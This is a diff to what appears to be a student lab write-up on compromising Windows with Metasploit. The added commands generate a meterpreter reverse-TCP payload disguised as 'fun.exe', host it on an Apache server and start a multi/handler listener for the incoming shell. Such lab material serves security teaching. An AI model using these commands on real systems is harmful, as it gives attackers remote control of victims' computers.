@@ -1,13 +1,12 @@
-# Compromising-windows-using-Metasploit
-Compromising windows using Metasploit
+EXP.NO:6
+DATE:
 
-# Metasploit
-Compromising windows using Metasploit
+# Compromising windows using Metasploit
 
 # AIM:
 To Compromise windows using Metasploit .
 
-## DESIGN STEPS:
+# ALGORITHM:
 ### Step 1:
 Install kali linux either in partition or virtual box or in live mode
 
@@ -16,6 +15,22 @@ Investigate on the various categories of tools as follows:
 
 ### Step 3:
 Open terminal and try execute some kali linux commands
+
+## Commands:
+```
+ipconfig
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 -f exe > fun.exe
+cp fun.exe /var/www/html
+sudo systemctl apache2 start
+msfconsole
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 0.0.0.0
+exploit
+ps
+
+
+```
 
 ## EXECUTION STEPS AND ITS OUTPUT:
 
@@ -43,7 +58,7 @@ Invoke msfconsole:
 ## OUTPUT:
 ![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/afb1606a-460c-4142-840f-2c5eca6de9df)
 
-Type help or a question mark "?" to see the list of all available commands you can use inside msfconsole
+ype help or a question mark "?" to see the list of all available commands you can use inside msfconsole
 ![image](https://github.com/Priya-Loganathan/Compromising-windows-using-Metasploit/assets/121166075/5485dcda-63dc-46fc-9e17-982b7fb666c1)
 
 Starting a command and control Server use multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST 0.0.0.0 exploit
